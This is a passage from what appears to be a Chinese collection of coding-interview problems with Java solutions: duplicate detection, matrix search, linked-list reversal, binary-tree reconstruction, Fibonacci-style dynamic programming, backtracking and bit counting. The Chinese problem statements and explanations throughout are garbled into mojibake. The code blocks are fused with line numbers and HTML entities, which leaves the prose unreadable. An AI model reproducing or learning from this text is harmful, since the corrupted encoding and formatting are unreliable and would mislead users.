ä¸ªä½ç½®ä¸Šã€‚ ä»¥ (2, 3, 1, 0, 2, 5) ä¸ºä¾‹ï¼š 12345678position-0 : (2,3,1,0,2,5) // 2 &lt;-&gt; 1 (1,3,2,0,2,5) // 1 &lt;-&gt; 3 (3,1,2,0,2,5) // 3 &lt;-&gt; 0 (0,1,2,3,2,5) // already in positionposition-1 : (0,1,2,3,2,5) // already in positionposition-2 : (0,1,2,3,2,5) // already in positionposition-3 : (0,1,2,3,2,5) // already in positionposition-4 : (0,1,2,3,2,5) // nums[i] == nums[nums[i]], exit éå†åˆ°ä½ç½® 4 æ—¶ï¼Œè¯¥ä½ç½®ä¸Šçš„æ•°ä¸º 2ï¼Œä½†æ˜¯ç¬¬ 2 ä¸ªä½ç½®ä¸Šå·²ç»æœ‰ä¸€ä¸ª 2 çš„å€¼äº†ï¼Œå› æ­¤å¯ä»¥çŸ¥é“ 2 é‡å¤ã€‚ 123456789101112131415161718public boolean duplicate(int[] nums, int length, int[] duplication) &#123; if (nums == null || length &lt;= 0) return false; for (int i = 0; i &lt; length; i++) &#123; while (nums[i] != i) &#123; if (nums[i] == nums[nums[i]]) &#123; duplication[0] = nums[i]; return true; &#125; swap(nums, i, nums[i]); &#125; &#125; return false;&#125;private void swap(int[] nums, int i, int j) &#123; int t = nums[i]; nums[i] = nums[j]; nums[j] = t;&#125; 4. äºŒç»´æ•°ç»„ä¸­çš„æŸ¥æ‰¾NowCoder é¢˜ç›®æè¿°åœ¨ä¸€ä¸ªäºŒç»´æ•°ç»„ä¸­ï¼Œæ¯ä¸€è¡Œéƒ½æŒ‰ç…§ä»å·¦åˆ°å³é€’å¢çš„é¡ºåºæ’åºï¼Œæ¯ä¸€åˆ—éƒ½æŒ‰ç…§ä»ä¸Šåˆ°ä¸‹é€’å¢çš„é¡ºåºæ’åºã€‚è¯·å®Œæˆä¸€ä¸ªå‡½æ•°ï¼Œè¾“å…¥è¿™æ ·çš„ä¸€ä¸ªäºŒç»´æ•°ç»„å’Œä¸€ä¸ªæ•´æ•°ï¼Œåˆ¤æ–­æ•°ç»„ä¸­æ˜¯å¦å«æœ‰è¯¥æ•´æ•°ã€‚ 1234567891011Consider the following matrix:[ [1, 4, 7, 11, 15], [2, 5, 8, 12, 19], [3, 6, 9, 16, 22], [10, 13, 14, 17, 24], [18, 21, 23, 26, 30]]Given target = 5, return true.Given target = 20, return false. è§£é¢˜æ€è·¯ä»å³ä¸Šè§’å¼€å§‹æŸ¥æ‰¾ã€‚å› ä¸ºçŸ©é˜µä¸­çš„ä¸€ä¸ªæ•°ï¼Œå®ƒå·¦è¾¹çš„æ•°éƒ½æ¯”å®ƒå°ï¼Œä¸‹è¾¹çš„æ•°éƒ½æ¯”å®ƒå¤§ã€‚å› æ­¤ï¼Œä»å³ä¸Šè§’å¼€å§‹æŸ¥æ‰¾ï¼Œå°±å¯ä»¥æ ¹æ® target å’Œå½“å‰å…ƒç´ çš„å¤§å°å…³ç³»æ¥ç¼©å°æŸ¥æ‰¾åŒºé—´ã€‚ å¤æ‚åº¦ï¼šO(M + N) + O(1) 123456789101112131415public boolean Find(int target, int[][] matrix) &#123; if (matrix == null || matrix.length == 0 || matrix[0].length == 0) return false; int rows = matrix.length, cols = matrix[0].length; int r = 0, c = cols - 1; // ä»å³ä¸Šè§’å¼€å§‹ while (r &lt;= rows - 1 &amp;&amp; c &gt;= 0) &#123; if (target == matrix[r][c]) return true; else if (target &gt; matrix[r][c]) r++; else c--; &#125; return false;&#125; 5. æ›¿æ¢ç©ºæ ¼NowCoder é¢˜ç›®æè¿°è¯·å®ç°ä¸€ä¸ªå‡½æ•°ï¼Œå°†ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­çš„ç©ºæ ¼æ›¿æ¢æˆâ€œ%20â€ã€‚ä¾‹å¦‚ï¼Œå½“å­—ç¬¦ä¸²ä¸º We Are Happy. åˆ™ç»è¿‡æ›¿æ¢ä¹‹åçš„å­—ç¬¦ä¸²ä¸º We%20Are%20Happyã€‚ è§£é¢˜æ€è·¯åœ¨å­—ç¬¦ä¸²å°¾éƒ¨å¡«å……ä»»æ„å­—ç¬¦ï¼Œä½¿å¾—å­—ç¬¦ä¸²çš„é•¿åº¦ç­‰äºå­—ç¬¦ä¸²æ›¿æ¢ä¹‹åçš„é•¿åº¦ã€‚å› ä¸ºä¸€ä¸ªç©ºæ ¼è¦æ›¿æ¢æˆä¸‰ä¸ªå­—ç¬¦ï¼ˆ%20ï¼‰ï¼Œå› æ­¤å½“éå†åˆ°ä¸€ä¸ªç©ºæ ¼æ—¶ï¼Œéœ€è¦åœ¨å°¾éƒ¨å¡«å……ä¸¤ä¸ªä»»æ„å­—ç¬¦ã€‚ ä»¤ P1 æŒ‡å‘å­—ç¬¦ä¸²åŸæ¥çš„æœ«å°¾ä½ç½®ï¼ŒP2 æŒ‡å‘å­—ç¬¦ä¸²ç°åœ¨çš„æœ«å°¾ä½ç½®ã€‚P1 å’Œ P2ä»åå‘å‰éå†ï¼Œå½“ P1 éå†åˆ°ä¸€ä¸ªç©ºæ ¼æ—¶ï¼Œå°±éœ€è¦ä»¤ P2 æŒ‡å‘çš„ä½ç½®ä¾æ¬¡å¡«å…… 02%ï¼ˆæ³¨æ„æ˜¯é€†åºçš„ï¼‰ï¼Œå¦åˆ™å°±å¡«å……ä¸Š P1 æŒ‡å‘å­—ç¬¦çš„å€¼ã€‚ ä»åå‘å‰éæ˜¯ä¸ºäº†åœ¨æ”¹å˜ P2 æ‰€æŒ‡å‘çš„å†…å®¹æ—¶ï¼Œä¸ä¼šå½±å“åˆ° P1 éå†åŸæ¥å­—ç¬¦ä¸²çš„å†…å®¹ã€‚ å¤æ‚åº¦ï¼šO(N) + O(1) 12345678910111213141516171819public String replaceSpace(StringBuffer str) &#123; int oldLen = str.length(); for (int i = 0; i &lt; oldLen; i++) if (str.charAt(i) == ' ') str.append(" "); int P1 = oldLen - 1, P2 = str.length() - 1; while (P1 &gt;= 0 &amp;&amp; P2 &gt; P1) &#123; char c = str.charAt(P1--); if (c == ' ') &#123; str.setCharAt(P2--, '0'); str.setCharAt(P2--, '2'); str.setCharAt(P2--, '%'); &#125; else &#123; str.setCharAt(P2--, c); &#125; &#125; return str.toString();&#125; 6. ä»å°¾åˆ°å¤´æ‰“å°é“¾è¡¨NowCoder é¢˜ç›®æè¿°è¾“å…¥é“¾è¡¨çš„ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ï¼Œä»å°¾åˆ°å¤´åè¿‡æ¥æ‰“å°å‡ºæ¯ä¸ªç»“ç‚¹çš„å€¼ã€‚ è§£é¢˜æ€è·¯ä½¿ç”¨æ ˆ1234567891011public ArrayList&lt;Integer&gt; printListFromTailToHead(ListNode listNode) &#123; Stack&lt;Integer&gt; stack = new Stack&lt;&gt;(); while (listNode != null) &#123; stack.add(listNode.val); listNode = listNode.next; &#125; ArrayList&lt;Integer&gt; ret = new ArrayList&lt;&gt;(); while (!stack.isEmpty()) ret.add(stack.pop()); return ret;&#125; ä½¿ç”¨é€’å½’12345678public ArrayList&lt;Integer&gt; printListFromTailToHead(ListNode listNode) &#123; ArrayList&lt;Integer&gt; ret = new ArrayList&lt;&gt;(); if (listNode != null) &#123; ret.addAll(printListFromTailToHead(listNode.next)); ret.add(listNode.val); &#125; return ret;&#125; ä½¿ç”¨ Collections.reverse()123456789public ArrayList&lt;Integer&gt; printListFromTailToHead(ListNode listNode) &#123; ArrayList&lt;Integer&gt; ret = new ArrayList&lt;&gt;(); while (listNode != null) &#123; ret.add(listNode.val); listNode = listNode.next; &#125; Collections.reverse(ret); return ret;&#125; ä½¿ç”¨å¤´æ’æ³•åˆ©ç”¨é“¾è¡¨å¤´æ’æ³•ä¸ºé€†åºçš„ç‰¹ç‚¹ã€‚ å¤´ç»“ç‚¹å’Œç¬¬ä¸€ä¸ªèŠ‚ç‚¹çš„åŒºåˆ«ï¼šå¤´ç»“ç‚¹æ˜¯åœ¨å¤´æ’æ³•ä¸­ä½¿ç”¨çš„ä¸€ä¸ªé¢å¤–èŠ‚ç‚¹ï¼Œè¿™ä¸ªèŠ‚ç‚¹ä¸å­˜å‚¨å€¼ï¼›ç¬¬ä¸€ä¸ªèŠ‚ç‚¹å°±æ˜¯é“¾è¡¨çš„ç¬¬ä¸€ä¸ªçœŸæ­£å­˜å‚¨å€¼çš„èŠ‚ç‚¹ã€‚ 123456789101112131415161718public ArrayList&lt;Integer&gt; printListFromTailToHead(ListNode listNode) &#123; // å¤´æ’æ³•æ„å»ºé€†åºé“¾è¡¨ ListNode head = new ListNode(-1); while (listNode != null) &#123; ListNode memo = listNode.next; listNode.next = head.next; head.next = listNode; listNode = memo; &#125; // æ„å»º ArrayList ArrayList&lt;Integer&gt; ret = new ArrayList&lt;&gt;(); head = head.next; while (head != null) &#123; ret.add(head.val); head = head.next; &#125; return ret;&#125; 7. é‡å»ºäºŒå‰æ ‘NowCoder é¢˜ç›®æè¿°æ ¹æ®äºŒå‰æ ‘çš„å‰åºéå†å’Œä¸­åºéå†çš„ç»“æœï¼Œé‡å»ºå‡ºè¯¥äºŒå‰æ ‘ã€‚å‡è®¾è¾“å…¥çš„å‰åºéå†å’Œä¸­åºéå†çš„ç»“æœä¸­éƒ½ä¸å«é‡å¤çš„æ•°å­—ã€‚ 12preorder = [3,9,20,15,7]inorder = [9,3,15,20,7] è§£é¢˜æ€è·¯å‰åºéå†çš„ç¬¬ä¸€ä¸ªå€¼ä¸ºæ ¹èŠ‚ç‚¹çš„å€¼ï¼Œä½¿ç”¨è¿™ä¸ªå€¼å°†ä¸­åºéå†ç»“æœåˆ†æˆä¸¤éƒ¨åˆ†ï¼Œå·¦éƒ¨åˆ†ä¸ºæ ‘çš„å·¦å­æ ‘ä¸­åºéå†ç»“æœï¼Œå³éƒ¨åˆ†ä¸ºæ ‘çš„å³å­æ ‘ä¸­åºéå†çš„ç»“æœã€‚ 123456789101112131415161718private Map&lt;Integer, Integer&gt; inOrderNumsIndexs = new HashMap&lt;&gt;(); // ç¼“å­˜ä¸­åºéå†æ•°ç»„çš„æ¯ä¸ªå€¼å¯¹åº”çš„ç´¢å¼•public TreeNode reConstructBinaryTree(int[] pre, int[] in) &#123; for (int i = 0; i &lt; in.length; i++) inOrderNumsIndexs.put(in[i], i); return reConstructBinaryTree(pre, 0, pre.length - 1, in, 0, in.length - 1);&#125;private TreeNode reConstructBinaryTree(int[] pre, int preL, int preR, int[] in, int inL, int inR) &#123; if (preL &gt; preR) return null; TreeNode root = new TreeNode(pre[preL]); int inIndex = inOrderNumsIndexs.get(root.val); int leftTreeSize = inIndex - inL; root.left = reConstructBinaryTree(pre, preL + 1, preL + leftTreeSize, in, inL, inL + leftTreeSize - 1); root.right = reConstructBinaryTree(pre, preL + leftTreeSize + 1, preR, in, inL + leftTreeSize + 1, inR); return root;&#125; 8. äºŒå‰æ ‘çš„ä¸‹ä¸€ä¸ªç»“ç‚¹NowCoder é¢˜ç›®æè¿°ç»™å®šä¸€ä¸ªäºŒå‰æ ‘å’Œå…¶ä¸­çš„ä¸€ä¸ªç»“ç‚¹ï¼Œè¯·æ‰¾å‡ºä¸­åºéå†é¡ºåºçš„ä¸‹ä¸€ä¸ªç»“ç‚¹å¹¶ä¸”è¿”å›ã€‚æ³¨æ„ï¼Œæ ‘ä¸­çš„ç»“ç‚¹ä¸ä»…åŒ…å«å·¦å³å­ç»“ç‚¹ï¼ŒåŒæ—¶åŒ…å«æŒ‡å‘çˆ¶ç»“ç‚¹çš„æŒ‡é’ˆã€‚ è§£é¢˜æ€è·¯â‘  å¦‚æœä¸€ä¸ªèŠ‚ç‚¹çš„å³å­æ ‘ä¸ä¸ºç©ºï¼Œé‚£ä¹ˆè¯¥èŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹æ˜¯å³å­æ ‘çš„æœ€å·¦èŠ‚ç‚¹ï¼› â‘¡ å¦åˆ™ï¼Œå‘ä¸Šæ‰¾ç¬¬ä¸€ä¸ªå·¦é“¾æ¥æŒ‡å‘çš„æ ‘åŒ…å«è¯¥èŠ‚ç‚¹çš„ç¥–å…ˆèŠ‚ç‚¹ã€‚ 12345678910public class TreeLinkNode &#123; int val; TreeLinkNode left = null; TreeLinkNode right = null; TreeLinkNode next = null; TreeLinkNode(int val) &#123; this.val = val; &#125;&#125; 12345678910111213141516public TreeLinkNode GetNext(TreeLinkNode pNode) &#123; if (pNode.right != null) &#123; TreeLinkNode node = pNode.right; while (node.left != null) node = node.left; return node; &#125; else &#123; while (pNode.next != null) &#123; TreeLinkNode parent = pNode.next; if (parent.left == pNode) return parent; pNode = pNode.next; &#125; &#125; return null;&#125; 9. ç”¨ä¸¤ä¸ªæ ˆå®ç°é˜Ÿåˆ—NowCoder é¢˜ç›®æè¿°ç”¨ä¸¤ä¸ªæ ˆæ¥å®ç°ä¸€ä¸ªé˜Ÿåˆ—ï¼Œå®Œæˆé˜Ÿåˆ—çš„ Push å’Œ Pop æ“ä½œã€‚é˜Ÿåˆ—ä¸­çš„å…ƒç´ ä¸º int ç±»å‹ã€‚ è§£é¢˜æ€è·¯in æ ˆç”¨æ¥å¤„ç†å…¥æ ˆï¼ˆpushï¼‰æ“ä½œï¼Œout æ ˆç”¨æ¥å¤„ç†å‡ºæ ˆï¼ˆpopï¼‰æ“ä½œã€‚ä¸€ä¸ªå…ƒç´ è¿›å…¥ in æ ˆä¹‹åï¼Œå‡ºæ ˆçš„é¡ºåºè¢«åè½¬ã€‚å½“å…ƒç´ è¦å‡ºæ ˆæ—¶ï¼Œéœ€è¦å…ˆè¿›å…¥ out æ ˆï¼Œæ­¤æ—¶å…ƒç´ å‡ºæ ˆé¡ºåºå†ä¸€æ¬¡è¢«åè½¬ï¼Œå› æ­¤å‡ºæ ˆé¡ºåºå°±å’Œæœ€å¼€å§‹å…¥æ ˆé¡ºåºæ˜¯ç›¸åŒçš„ï¼Œå…ˆè¿›å…¥çš„å…ƒç´ å…ˆé€€å‡ºï¼Œè¿™å°±æ˜¯é˜Ÿåˆ—çš„é¡ºåºã€‚ 1234567891011121314151617Stack&lt;Integer&gt; in = new Stack&lt;Integer&gt;();Stack&lt;Integer&gt; out = new Stack&lt;Integer&gt;();public void push(int node) &#123; in.push(node);&#125;public int pop() throws Exception &#123; if (out.isEmpty()) while (!in.isEmpty()) out.push(in.pop()); if (out.isEmpty()) throw new Exception("queue is empty"); return out.pop();&#125; 10.1 æ–æ³¢é‚£å¥‘æ•°åˆ—NowCoder é¢˜ç›®æè¿°æ±‚è²æ³¢é‚£å¥‘æ•°åˆ—çš„ç¬¬ n é¡¹ï¼Œn &lt;= 39ã€‚ è§£é¢˜æ€è·¯å¦‚æœä½¿ç”¨é€’å½’æ±‚è§£ï¼Œä¼šé‡å¤è®¡ç®—ä¸€äº›å­é—®é¢˜ã€‚ä¾‹å¦‚ï¼Œè®¡ç®— f(10) éœ€è¦è®¡ç®— f(9) å’Œ f(8)ï¼Œè®¡ç®— f(9) éœ€è¦è®¡ç®— f(8) å’Œ f(7)ï¼Œå¯ä»¥çœ‹åˆ° f(8) è¢«é‡å¤è®¡ç®—äº†ã€‚ é€’å½’æ–¹æ³•æ˜¯å°†ä¸€ä¸ªé—®é¢˜åˆ’åˆ†æˆå¤šä¸ªå­é—®é¢˜æ±‚è§£ï¼ŒåŠ¨æ€è§„åˆ’ä¹Ÿæ˜¯å¦‚æ­¤ï¼Œä½†æ˜¯åŠ¨æ€è§„åˆ’ä¼šæŠŠå­é—®é¢˜çš„è§£ç¼“å­˜èµ·æ¥ï¼Œé¿å…é‡å¤æ±‚è§£å­é—®é¢˜ã€‚ 123456789public int Fibonacci(int n) &#123; if (n &lt;= 1) return n; int[] fib = new int[n + 1]; fib[1] = 1; for (int i = 2; i &lt;= n; i++) fib[i] = fib[i - 1] + fib[i - 2]; return fib[n];&#125; è€ƒè™‘åˆ°ç¬¬ i é¡¹åªä¸ç¬¬ i-1 å’Œç¬¬ i-2 é¡¹æœ‰å…³ï¼Œå› æ­¤åªéœ€è¦å­˜å‚¨å‰ä¸¤é¡¹çš„å€¼å°±èƒ½æ±‚è§£ç¬¬ i é¡¹ï¼Œä»è€Œå°†ç©ºé—´å¤æ‚åº¦ç”± O(N) é™ä½ä¸º O(1)ã€‚ 123456789101112public int Fibonacci(int n) &#123; if (n &lt;= 1) return n; int pre2 = 0, pre1 = 1; int fib = 0; for (int i = 2; i &lt;= n; i++) &#123; fib = pre2 + pre1; pre2 = pre1; pre1 = fib; &#125; return fib;&#125; ç”±äºå¾…æ±‚è§£çš„ n å°äº 40ï¼Œå› æ­¤å¯ä»¥å°†å‰ 40 é¡¹çš„ç»“æœå…ˆè¿›è¡Œè®¡ç®—ï¼Œä¹‹åå°±èƒ½ä»¥ O(1) æ—¶é—´å¤æ‚åº¦å¾—åˆ°ç¬¬ n é¡¹çš„å€¼äº†ã€‚ 1234567891011121314public class Solution &#123; private int[] fib = new int[40]; public Solution() &#123; fib[1] = 1; fib[2] = 2; for (int i = 2; i &lt; fib.length; i++) fib[i] = fib[i - 1] + fib[i - 2]; &#125; public int Fibonacci(int n) &#123; return fib[n]; &#125;&#125; 10.2 è·³å°é˜¶NowCoder é¢˜ç›®æè¿°ä¸€åªé’è›™ä¸€æ¬¡å¯ä»¥è·³ä¸Š 1 çº§å°é˜¶ï¼Œä¹Ÿå¯ä»¥è·³ä¸Š 2 çº§ã€‚æ±‚è¯¥é’è›™è·³ä¸Šä¸€ä¸ª n çº§çš„å°é˜¶æ€»å…±æœ‰å¤šå°‘ç§è·³æ³•ã€‚ è§£é¢˜æ€è·¯å¤æ‚åº¦ï¼šO(N) + O(N) 12345678910public int JumpFloor(int n) &#123; if (n == 1) return 1; int[] dp = new int[n]; dp[0] = 1; dp[1] = 2; for (int i = 2; i &lt; n; i++) dp[i] = dp[i - 1] + dp[i - 2]; return dp[n - 1];&#125; å¤æ‚åº¦ï¼šO(N) + O(1) 123456789101112public int JumpFloor(int n) &#123; if (n &lt;= 1) return n; int pre2 = 0, pre1 = 1; int result = 0; for (int i = 1; i &lt;= n; i++) &#123; result = pre2 + pre1; pre2 = pre1; pre1 = result; &#125; return result;&#125; 10.3 å˜æ€è·³å°é˜¶NowCoder é¢˜ç›®æè¿°ä¸€åªé’è›™ä¸€æ¬¡å¯ä»¥è·³ä¸Š 1 çº§å°é˜¶ï¼Œä¹Ÿå¯ä»¥è·³ä¸Š 2 çº§â€¦ å®ƒä¹Ÿå¯ä»¥è·³ä¸Š n çº§ã€‚æ±‚è¯¥é’è›™è·³ä¸Šä¸€ä¸ª n çº§çš„å°é˜¶æ€»å…±æœ‰å¤šå°‘ç§è·³æ³•ã€‚ è§£é¢˜æ€è·¯12345678public int JumpFloorII(int target) &#123; int[] dp = new int[target]; Arrays.fill(dp, 1); for (int i = 1; i &lt; target; i++) for (int j = 0; j &lt; i; j++) dp[i] += dp[j]; return dp[target - 1];&#125; 10.4 çŸ©å½¢è¦†ç›–NowCoder é¢˜ç›®æè¿°æˆ‘ä»¬å¯ä»¥ç”¨ 2*1 çš„å°çŸ©å½¢æ¨ªç€æˆ–è€…ç«–ç€å»è¦†ç›–æ›´å¤§çš„çŸ©å½¢ã€‚è¯·é—®ç”¨ n ä¸ª 2*1 çš„å°çŸ©å½¢æ— é‡å åœ°è¦†ç›–ä¸€ä¸ª 2*n çš„å¤§çŸ©å½¢ï¼Œæ€»å…±æœ‰å¤šå°‘ç§æ–¹æ³•ï¼Ÿ è§£é¢˜æ€è·¯å¤æ‚åº¦ï¼šO(N) + O(N) 12345678910public int RectCover(int n) &#123; if (n &lt;= 2) return n; int[] dp = new int[n]; dp[0] = 1; dp[1] = 2; for (int i = 2; i &lt; n; i++) dp[i] = dp[i - 1] + dp[i - 2]; return dp[n - 1];&#125; å¤æ‚åº¦ï¼šO(N) + O(1) 123456789101112public int RectCover(int n) &#123; if (n &lt;= 2) return n; int pre2 = 1, pre1 = 2; int result = 0; for (int i = 3; i &lt;= n; i++) &#123; result = pre2 + pre1; pre2 = pre1; pre1 = result; &#125; return result;&#125; 11. æ—‹è½¬æ•°ç»„çš„æœ€å°æ•°å­—NowCoder é¢˜ç›®æè¿°æŠŠä¸€ä¸ªæ•°ç»„æœ€å¼€å§‹çš„è‹¥å¹²ä¸ªå…ƒç´ æ¬åˆ°æ•°ç»„çš„æœ«å°¾ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºæ•°ç»„çš„æ—‹è½¬ã€‚è¾“å…¥ä¸€ä¸ªéé€’å‡æ’åºçš„æ•°ç»„çš„ä¸€ä¸ªæ—‹è½¬ï¼Œè¾“å‡ºæ—‹è½¬æ•°ç»„çš„æœ€å°å…ƒç´ ã€‚ä¾‹å¦‚æ•°ç»„ {3, 4, 5, 1, 2} ä¸º {1, 2, 3, 4, 5} çš„ä¸€ä¸ªæ—‹è½¬ï¼Œè¯¥æ•°ç»„çš„æœ€å°å€¼ä¸º 1ã€‚NOTEï¼šç»™å‡ºçš„æ‰€æœ‰å…ƒç´ éƒ½å¤§äº 0ï¼Œè‹¥æ•°ç»„å¤§å°ä¸º 0ï¼Œè¯·è¿”å› 0ã€‚ è§£é¢˜æ€è·¯å½“ nums[m] &lt;= nums[h] çš„æƒ…å†µä¸‹ï¼Œè¯´æ˜è§£åœ¨ [l, m] ä¹‹é—´ï¼Œæ­¤æ—¶ä»¤ h = mï¼›å¦åˆ™è§£åœ¨ [m + 1, h] ä¹‹é—´ï¼Œä»¤ l = m + 1ã€‚ å› ä¸º h çš„èµ‹å€¼è¡¨è¾¾å¼ä¸º h = mï¼Œå› æ­¤å¾ªç¯ä½“çš„å¾ªç¯æ¡ä»¶åº”è¯¥ä¸º l &lt; hï¼Œè¯¦ç»†è§£é‡Šè¯·è§ Leetcode é¢˜è§£ã€‚ å¤æ‚åº¦ï¼šO(logN) + O(1) 12345678910111213public int minNumberInRotateArray(int[] nums) &#123; if (nums.length == 0) return 0; int l = 0, h = nums.length - 1; while (l &lt; h) &#123; int m = l + (h - l) / 2; if (nums[m] &lt;= nums[h]) h = m; else l = m + 1; &#125; return nums[l];&#125; 12. çŸ©é˜µä¸­çš„è·¯å¾„NowCoder é¢˜ç›®æè¿°è¯·è®¾è®¡ä¸€ä¸ªå‡½æ•°ï¼Œç”¨æ¥åˆ¤æ–­åœ¨ä¸€ä¸ªçŸ©é˜µä¸­æ˜¯å¦å­˜åœ¨ä¸€æ¡åŒ…å«æŸå­—ç¬¦ä¸²æ‰€æœ‰å­—ç¬¦çš„è·¯å¾„ã€‚è·¯å¾„å¯ä»¥ä»çŸ©é˜µä¸­çš„ä»»æ„ä¸€ä¸ªæ ¼å­å¼€å§‹ï¼Œæ¯ä¸€æ­¥å¯ä»¥åœ¨çŸ©é˜µä¸­å‘å·¦ï¼Œå‘å³ï¼Œå‘ä¸Šï¼Œå‘ä¸‹ç§»åŠ¨ä¸€ä¸ªæ ¼å­ã€‚å¦‚æœä¸€æ¡è·¯å¾„ç»è¿‡äº†çŸ©é˜µä¸­çš„æŸä¸€ä¸ªæ ¼å­ï¼Œåˆ™è¯¥è·¯å¾„ä¸èƒ½å†è¿›å…¥è¯¥æ ¼å­ã€‚ ä¾‹å¦‚ä¸‹é¢çš„çŸ©é˜µåŒ…å«äº†ä¸€æ¡ bfce è·¯å¾„ã€‚ è§£é¢˜æ€è·¯1234567891011121314151617181920212223242526272829303132333435363738private final static int[][] next = &#123;&#123;0, -1&#125;, &#123;0, 1&#125;, &#123;-1, 0&#125;, &#123;1, 0&#125;&#125;;private int rows;private int cols;public boolean hasPath(char[] array, int rows, int cols, char[] str) &#123; if (rows == 0 || cols == 0) return false; this.rows = rows; this.cols = cols; boolean[][] marked = new boolean[rows][cols]; char[][] matrix = buildMatrix(array); for (int i = 0; i &lt; rows; i++) for (int j = 0; j &lt; cols; j++) if (backtracking(matrix, str, marked, 0, i, j)) return true; return false;&#125;private boolean backtracking(char[][] matrix, char[] str, boolean[][] marked, int pathLen, int r, int c) &#123; if (pathLen == str.length) return true; if (r &lt; 0 || r &gt;= rows || c &lt; 0 || c &gt;= cols || matrix[r][c] != str[pathLen] || marked[r][c]) return false; marked[r][c] = true; for (int[] n : next) if (backtracking(matrix, str, marked, pathLen + 1, r + n[0], c + n[1])) return true; marked[r][c] = false; return false;&#125;private char[][] buildMatrix(char[] array) &#123; char[][] matrix = new char[rows][cols]; for (int i = 0, idx = 0; i &lt; rows; i++) for (int j = 0; j &lt; cols; j++) matrix[i][j] = array[idx++]; return matrix;&#125; 13. æœºå™¨äººçš„è¿åŠ¨èŒƒå›´NowCoder é¢˜ç›®æè¿°åœ°ä¸Šæœ‰ä¸€ä¸ª m è¡Œå’Œ n åˆ—çš„æ–¹æ ¼ã€‚ä¸€ä¸ªæœºå™¨äººä»åæ ‡ (0, 0) çš„æ ¼å­å¼€å§‹ç§»åŠ¨ï¼Œæ¯ä¸€æ¬¡åªèƒ½å‘å·¦å³ä¸Šä¸‹å››ä¸ªæ–¹å‘ç§»åŠ¨ä¸€æ ¼ï¼Œä½†æ˜¯ä¸èƒ½è¿›å…¥è¡Œåæ ‡å’Œåˆ—åæ ‡çš„æ•°ä½ä¹‹å’Œå¤§äº k çš„æ ¼å­ã€‚ä¾‹å¦‚ï¼Œå½“ k ä¸º 18 æ—¶ï¼Œæœºå™¨äººèƒ½å¤Ÿè¿›å…¥æ–¹æ ¼ï¼ˆ35, 37ï¼‰ï¼Œå› ä¸º 3+5+3+7=18ã€‚ä½†æ˜¯ï¼Œå®ƒä¸èƒ½è¿›å…¥æ–¹æ ¼ï¼ˆ35, 38ï¼‰ï¼Œå› ä¸º 3+5+3+8=19ã€‚è¯·é—®è¯¥æœºå™¨äººèƒ½å¤Ÿè¾¾åˆ°å¤šå°‘ä¸ªæ ¼å­ï¼Ÿ è§£é¢˜æ€è·¯123456789101112131415161718192021222324252627282930313233343536373839404142private static final int[][] next = &#123;&#123;0, -1&#125;, &#123;0, 1&#125;, &#123;-1, 0&#125;, &#123;1, 0&#125;&#125;;private int cnt = 0;private int rows;private int cols;private int threshold;private int[][] digitSum;public int movingCount(int threshold, int rows, int cols) &#123; this.rows = rows; this.cols = cols; this.threshold = threshold; initDigitSum(); boolean[][] marked = new boolean[rows][cols]; dfs(marked, 0, 0); return cnt;&#125;private void dfs(boolean[][] marked, int r, int c) &#123; if (r &lt; 0 || r &gt;= rows || c &lt; 0 || c &gt;= cols || marked[r][c]) return; marked[r][c] = true; if (this.digitSum[r][c] &gt; this.threshold) return; cnt++; for (int[] n : next) dfs(marked, r + n[0], c + n[1]);&#125;private void initDigitSum() &#123; int[] digitSumOne = new int[Math.max(rows, cols)]; for (int i = 0; i &lt; digitSumOne.length; i++) &#123; int n = i; while (n &gt; 0) &#123; digitSumOne[i] += n % 10; n /= 10; &#125; &#125; digitSum = new int[rows][cols]; for (int i = 0; i &lt; this.rows; i++) for (int j = 0; j &lt; this.cols; j++) digitSum[i][j] = digitSumOne[i] + digitSumOne[j];&#125; 14. å‰ªç»³å­Leetcode é¢˜ç›®æè¿°æŠŠä¸€æ ¹ç»³å­å‰ªæˆå¤šæ®µï¼Œå¹¶ä¸”ä½¿å¾—æ¯æ®µçš„é•¿åº¦ä¹˜ç§¯æœ€å¤§ã€‚ For example, given n = 2, return 1 (2 = 1 + 1); given n = 10, return 36 (10 = 3 + 3 + 4). è§£é¢˜æ€è·¯åŠ¨æ€è§„åˆ’è§£æ³•12345678public int integerBreak(int n) &#123; int[] dp = new int[n + 1]; dp[1] = 1; for (int i = 2; i &lt;= n; i++) for (int j = 1; j &lt; i; j++) dp[i] = Math.max(dp[i], Math.max(j * (i - j), dp[j] * (i - j))); return dp[n];&#125; è´ªå¿ƒè§£æ³•å°½å¯èƒ½å¤šå‰ªé•¿åº¦ä¸º 3 çš„ç»³å­ï¼Œå¹¶ä¸”ä¸å…è®¸æœ‰é•¿åº¦ä¸º 1 çš„ç»³å­å‡ºç°ï¼Œå¦‚æœå‡ºç°äº†ï¼Œå°±ä»å·²ç»åˆ‡å¥½é•¿åº¦ä¸º 3 çš„ç»³å­ä¸­æ‹¿å‡ºä¸€æ®µä¸é•¿åº¦ä¸º 1 çš„ç»³å­é‡æ–°ç»„åˆï¼ŒæŠŠå®ƒä»¬åˆ‡æˆä¸¤æ®µé•¿åº¦ä¸º 2 çš„ç»³å­ã€‚ è¯æ˜ï¼šå½“ n &gt;= 5 æ—¶ï¼Œ3(n - 3) - 2(n - 2) = n - 5 &gt;= 0ã€‚å› æ­¤æŠŠé•¿åº¦å¤§äº 5 çš„ç»³å­åˆ‡æˆä¸¤æ®µï¼Œä»¤å…¶ä¸­ä¸€æ®µé•¿åº¦ä¸º 3 å¯ä»¥ä½¿å¾—ä¸¤æ®µçš„ä¹˜ç§¯æœ€å¤§ã€‚ 12345678910111213public int integerBreak(int n) &#123; if (n &lt; 2) return 0; if (n == 2) return 1; if (n == 3) return 2; int timesOf3 = n / 3; if (n - timesOf3 * 3 == 1) timesOf3--; int timesOf2 = (n - timesOf3 * 3) / 2; return (int) (Math.pow(3, timesOf3)) * (int) (Math.pow(2, timesOf2));&#125; 15. äºŒè¿›åˆ¶ä¸­ 1 çš„ä¸ªæ•°NowCoder é¢˜ç›®æè¿°è¾“å…¥ä¸€ä¸ªæ•´æ•°ï¼Œè¾“å‡ºè¯¥æ•°äºŒè¿›åˆ¶è¡¨ç¤ºä¸­ 1 çš„ä¸ªæ•°ã€‚ Integer.bitCount()123public int NumberOf1(int n) &#123; return Integer.bitCount(n);&#125; n&amp;(n-1)O(logM) æ—¶é—´å¤æ‚åº¦è§£æ³•ï¼Œå…¶ä¸­ M è¡¨ç¤º 1 